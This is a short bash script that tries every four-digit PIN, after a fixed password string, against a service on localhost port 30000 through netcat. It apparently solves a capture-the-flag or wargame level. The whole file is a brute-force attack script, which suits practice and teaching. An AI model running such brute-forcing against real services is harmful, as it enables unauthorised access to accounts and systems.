


#!/bin/bash


for i in {0..9};do
        for j in {0..9};do
                for k in {0..9};do
                        for z in {0..9};do
                                echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i$j$k$z" | nc 127.0.0.1 30000 2>/dev/null
                        done
                done
        done
done
